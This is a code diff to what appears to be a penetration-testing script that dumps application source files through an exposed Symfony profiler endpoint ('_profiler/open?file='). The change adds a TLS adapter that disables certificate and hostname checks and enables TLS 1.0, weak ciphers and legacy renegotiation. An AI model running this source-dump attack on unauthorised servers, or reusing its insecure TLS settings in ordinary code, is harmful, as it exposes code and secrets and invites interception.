@@ -6,21 +6,75 @@
 
 import argparse
 import re
+import ssl
+import threading
 import requests
+from requests.adapters import HTTPAdapter
 # Disable warnings of insecure connection for invalid certificates
 requests.packages.urllib3.disable_warnings()
-# Allow use of deprecated and weak cipher methods
-requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
-try:
-    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
-except AttributeError:
-    pass
 from concurrent.futures import ThreadPoolExecutor
 import os
 from bs4 import BeautifulSoup
 
 
 VERSION = "1.1"
+
+# Cipher string accepting deprecated and weak cipher methods. The list has to be
+# based on ALL and not DEFAULT: DEFAULT already excludes COMPLEMENTOFDEFAULT,
+# which is exactly where the legacy suites live, so there would be nothing left
+# for SECLEVEL=0 to unlock. SECLEVEL=0 is then what lets OpenSSL 3.x actually
+# negotiate them (small keys, SHA-1 signatures, ...).
+LEGACY_CIPHERS = "ALL:@SECLEVEL=0:HIGH:!DH:!aNULL"
+
+
+class LegacyTLSAdapter(HTTPAdapter):
+    """Requests adapter talking to servers with an outdated TLS stack.
+
+    urllib3 >= 2.0 dropped ssl_.DEFAULT_CIPHERS and follows the OpenSSL
+    defaults, which refuse old ciphers, TLS < 1.2 and unsafe renegotiation.
+    """
+
+    def __init__(self, *args, **kwargs):
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+        # MINIMUM_SUPPORTED rather than TLSv1, which is deprecated and would
+        # print a DeprecationWarning on every run. SSLv3 stays disabled by the
+        # OP_NO_SSLv3 of the default context, so this lands on TLS 1.0.
+        try:
+            context.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED
+        except (AttributeError, ValueError):
+            pass
+        # Servers not implementing RFC 5746 secure renegotiation
+        context.options |= getattr(ssl, "OP_LEGACY_SERVER_CONNECT", 0x4)
+        try:
+            context.set_ciphers(LEGACY_CIPHERS)
+        except ssl.SSLError:
+            pass
+        self.ssl_context = context
+        super().__init__(*args, **kwargs)
+
+    def init_poolmanager(self, *args, **kwargs):
+        kwargs["ssl_context"] = self.ssl_context
+        return super().init_poolmanager(*args, **kwargs)
+
+    def proxy_manager_for(self, *args, **kwargs):
+        kwargs["ssl_context"] = self.ssl_context
+        return super().proxy_manager_for(*args, **kwargs)
+
+
+_thread_local = threading.local()
+
+
+def get_session():
+    """Return this thread's requests.Session, created on first use."""
+    session = getattr(_thread_local, "session", None)
+    if session is None:
+        session = requests.Session()
+        session.verify = False
+        session.mount("https://", LegacyTLSAdapter())
+        _thread_local.session = session
+    return session
 
 
 def filesize_to_str(filecontent):
@@ -33,7 +87,7 @@ def filesize_to_str(filecontent):
 
 
 def extract_links(url):
-    r = requests.get(url)
+    r = get_session().get(url)
     soup = BeautifulSoup(r.content, "html.parser")
     files = []
     for link in soup.find_all("a", href=True):
@@ -50,7 +104,7 @@ def extract_links(url):
 
 def worker_dump_source(target, path_to_file, options):
     try:
-        r = requests.get(
+        r = get_session().get(
             url=f"{target}/_profiler/open?file={path_to_file}&line=0"
         )
 
@@ -115,7 +169,7 @@ if __name__ == '__main__':
     ]
 
     # Automatically extract file paths from debug page
-    r = requests.get(options.target)
+    r = get_session().get(options.target)
     if "X-Debug-Token-Link" in r.headers.keys():
         panels = [
             "request", "time", "validator", "form", "exception", "logger", "events", "router",
